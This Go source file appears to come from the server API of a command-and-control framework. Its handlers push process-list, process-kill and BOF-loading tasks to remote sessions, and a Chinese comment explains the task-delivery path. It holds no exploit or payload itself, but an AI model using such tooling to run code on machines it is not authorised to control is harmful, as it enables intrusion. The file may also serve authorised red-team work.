package api

import (
	"encoding/json"
	"net/http"
	"strconv"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

func (s *Server) listProcessesHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateProcessList(id)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Process list task pushed to session %s", id)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "Process list task pushed",
	})
}

func (s *Server) killProcessHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]
	pidStr := vars["pid"]

	pid, err := strconv.ParseUint(pidStr, 10, 32)
	if err != nil {
		http.Error(w, `{"error":"Invalid PID"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateProcessKill(id, uint32(pid))
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Process kill task pushed to session %s, PID: %d", id, pid)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"pid":       pid,
		"message":   "Process kill task pushed",
	})
}

func (s *Server) loadBofHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var payload struct {
		Data string `json:"data"`
		Args string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateBOFLoad(id, payload.Data, payload.Args)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	// 统一走 listener.PushTask：与其它任务共用同一投递链路（TCP 即时推送 / HTTP 轮询拉取），
	// 不再直接写 session.Tasks（该通道无任何读取方，直接写入会导致 BOF 任务静默丢失）。
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	logging.Info("api", "BOF load task pushed to session %s", id)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "BOF load task queued",
	})
}
